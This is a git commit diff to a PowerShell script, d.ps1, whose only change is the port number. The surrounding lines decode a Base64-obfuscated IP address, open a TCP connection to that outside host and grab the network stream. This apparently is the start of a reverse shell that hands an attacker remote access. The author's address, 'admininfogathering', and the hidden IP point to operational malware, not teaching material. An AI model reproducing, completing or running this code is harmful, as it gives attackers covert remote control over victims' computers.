45e60f297b02afe4bf74c014f586b7d15e855fa4
jktvz <admininfogathering@proton.me>
2026-02-12 20:18:20 +0300

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -9,7 +9,7 @@ try {
     
     
     $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
-    $port = 38980;
+    $port = 47045;
 
     $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
     $NetworkStream = $TCPClient.GetStream();
